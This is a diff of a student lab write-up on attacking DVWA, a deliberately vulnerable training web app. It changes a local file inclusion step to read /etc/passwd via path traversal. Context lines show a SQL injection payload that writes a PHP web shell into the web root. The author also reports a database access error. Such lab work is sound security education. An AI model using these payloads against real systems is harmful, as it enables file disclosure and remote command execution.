@@ -30,7 +30,7 @@
 
 - From the website, navigate to `File Inclusion`.
 - Notice how the end of the URL contains the following parameter: `page=include.php`.
-- Replace `include.php` with `../../../../../../proc/version`
+- Replace `include.php` with `../../../../../../etc/passwd`
 - You should see the following:
 
 <img src="https://github.com/AndreaPallotta/CSEC_472_Group_2/blob/main/lab_3/screenshots/local_file_inclusion.PNG" alt="local_file_inclusion_screenshot" />
@@ -48,4 +48,4 @@
 
 - POSSIBLE PAYLOAD: `' UNION SELECT "<? system($_REQUEST['cmd']); ?>",2,3,4 INTO OUTFILE "/var/www/html/temp/c.php"#`
 
-I am getting the following error, but it might be caused by the way I set up the webapp:  `Acceess denied for user 'dvwa'@'localhost' (using password: YES)`
+I am getting the following error, but it might be caused by the way I set up the webapp: `Acceess denied for user 'dvwa'@'localhost' (using password: YES)`
